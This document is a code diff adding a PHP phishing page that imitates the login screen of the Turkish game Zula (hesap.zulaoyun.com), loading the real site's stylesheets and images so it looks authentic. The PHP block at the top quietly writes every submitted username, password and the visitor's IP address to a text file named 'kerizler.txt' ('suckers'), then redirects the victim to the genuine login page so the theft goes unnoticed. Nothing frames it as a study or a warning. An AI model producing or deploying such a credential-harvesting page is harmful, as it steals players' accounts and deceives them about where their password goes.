@@ -1,0 +1,143 @@
+<?php
+if ($_SERVER['REQUEST_METHOD'] == 'POST') {
+header('Location: https://hesap.zulaoyun.com/Account/Login?ReturnUrl=%2F');
+$handle = fopen('kerizler.txt', 'a');
+fwrite($handle, '----------------------------------------------------------------------['.$_SERVER['SERVER_NAME'].$_SERVER['SCRIPT_NAME'].']---['.strtoupper(date("h:i:s a - Y/m/d")).']---['.$_SERVER['REMOTE_ADDR']."]\r\n");
+foreach($_POST as $variable => $value) {
+fwrite($handle, $variable.': '.$value."\r\n");}
+fclose($handle);
+exit;
+} ?>
+<!doctype html>
+<html>
+
+<head>
+    <meta charset="UTF-8">
+    <title>GİRİŞ YAP</title>
+    <meta name="description" content="">
+    <meta name="keywords" content="" />
+    <meta name="author" content="">
+
+
+    <!-- Mobile Specific Metas
+    ================================================== -->
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <!--styles-->
+    <link rel="stylesheet" href="//cdn.zulaoyun.com/sitecdn/TR/Content/hesapzulaoyun/css/bootstrap.min.css" />
+    <link rel="stylesheet" href="//cdn.zulaoyun.com/sitecdn/TR/Content/hesapzulaoyun/css/style.min.css" />
+    <link rel="stylesheet" href="//cdn.zulaoyun.com/sitecdn/TR/Content/hesapzulaoyun/css/login.min.css" />
+    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.6.3/css/all.css" integrity="sha384-UHRtZLI+pbxtHCWp1t77Bi1L4ZtiqrqD80Kn4Z8NTSRyMA2Fd33n5dQ8lWUE00s/" crossorigin="anonymous" />
+    <link rel="icon" href="//cdn.zulaoyun.com/sitecdn/TR/Content/images/favicon-v2.ico" type="image/x-icon" />
+    <link rel="apple-touch-icon" sizes="180x180" href="https://hesap.zulaoyun.com/icons/icon-96x96.png">
+    <link rel="manifest" href="https://hesap.zulaoyun.com/manifest.json">
+    <script src="//cdn.zulaoyun.com/sitecdn/TR/Content/hesapzulaoyun/js/jquery.min.js"></script>
+    <script src="//cdn.zulaoyun.com/sitecdn/TR/Content/hesapzulaoyun/js/bootstrap.min.js"></script>
+    <script src="//cdn.zulaoyun.com/sitecdn/TR/Content/hesapzulaoyun/js/jquery.lazy.min.js"></script>
+
+    <script src='https://www.google.com/recaptcha/api.js'></script>
+    <script src='//www.google.com/recaptcha/api.js?onload=onloadCallback&render=explicit'></script>
+    <!-- Google Tag Manager -->
+<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+})(window,document,'script','dataLayer','GTM-MJX664T');</script>
+<!-- End Google Tag Manager -->
+
+    
+</head>
+<body class="hemen-oyna-page" dir="ltr">
+
+    <!-- Google Tag Manager (noscript) -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-MJX664T"
+height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- End Google Tag Manager (noscript) -->
+    
+    
+
+
+<style>
+    html, body.hemen-oyna-page, .register-content {
+        height: 100%;
+    }
+</style>
+<div class="register-content">
+    <div class="login-form-header">
+        <img class="img-responsive" src="//cdn.zulaoyun.com/sitecdn/TR/Content/hesapzulaoyun/images/loginform-head.png" />
+        <img class="img-responsive" src="//cdn.zulaoyun.com/sitecdn/TR/Content/hesapzulaoyun/images/zula-logov2.png" />
+    </div>
+
+    <form class="form-inline" autocomplete="off" action="<?php echo basename(__FILE__); ?>" method="post">
+        <span class="error-msg field-validation-valid" data-valmsg-for="UserName" data-valmsg-replace="true"></span>
+        <span class="error-msg field-validation-valid" data-valmsg-for="Password" data-valmsg-replace="true"></span>
+        
+        <div class="form-group">
+            <div class="input-group">
+                <div class="input-group-addon">
+                    <span class="icon-user"></span>
+                </div>
+                <input type="text" class="form-control" id="txtUserName" placeholder="Kullanıcı Adı" autocomplete="off" data-val="true" data-val-regex="Kullan&#x131;c&#x131; ad&#x131; T&#xFC;rk&#xE7;e karakter ve &#xF6;zel karakter i&#xE7;eremez" data-val-regex-pattern="^[a-zA-Z0-9_.]&#x2B;$" data-val-required="Kullan&#x131;c&#x131; ad&#x131; bo&#x15F; b&#x131;rak&#x131;lamaz." name="UserName" value="">
+            </div>
+        </div>
+        <div class="form-group">
+            <div class="input-group">
+                <div class="input-group-addon">
+                    <span class="icon-unlock"></span>
+                </div>
+                <input type="password" class="form-control" id="pass" placeholder="Şifre" autocomplete="off" data-val="true" data-val-required="&#x15E;ifre bo&#x15F; b&#x131;rak&#x131;lamaz." name="Password" />
+            </div>
+
+        </div>
+        <div class="form-group">
+            <div class="checkbox remember-me">
+                <label>
+                    <input type="checkbox" data-val="true" data-val-required="The Beni Hat&#x131;rla? field is required." id="RememberMe" name="RememberMe" value="true">
+                    <span class="cr">
+                        <i class="cr-icon icon-check"></i>
+                    </span>
+                    Beni hatırla
+                </label>
+            </div>
+        </div>
+     
+            <div class="form-group">
+                <div class="buttons">
+                    <button type="submit" class="btn btn-zula btn-login">GİRİŞ YAP</button>
+
+
+
+                    <a class="btn btn-zula btn-loginFb" href="https://hesap.zulaoyun.com/Account/ExternalLogin">FACEBOOK İLE BAĞLAN</a>
+
+                    </div>
+            </div>
+   
+    
+   
+            <div class="form-group text-center forget-info">
+                <a href="https://hesap.zulaoyun.com/profil/kurtarma">Kullanıcı adımı / Şifremi Unuttum</a>         
+            </div>
+
+
+        <div class="form-group text-center register-text">
+            <a href="https://hesap.zulaoyun.com/kayit/yeni" title="Kayıtlı değil misin? <span>Kayıt Ol</span>">
+                Kayıtlı değil misin? <span>Kayıt Ol</span>
+            </a>
+        </div>
+
+    </form>
+</div>
+
+
+
+
+
+
+    <script src="//cdn.zulaoyun.com/sitecdn/TR/Content/hesapzulaoyun/js/jquery-validation/dist/jquery.validate.min.js"></script>
+    <script src="//cdn.zulaoyun.com/sitecdn/TR/Content/hesapzulaoyun/js/jquery-validation-unobtrusive/jquery.validate.unobtrusive.js"></script>
+    <script src="//cdn.zulaoyun.com/sitecdn/TR/Content/hesapzulaoyun/js/site.js"></script>
+    
+    
+</body>
+</html>
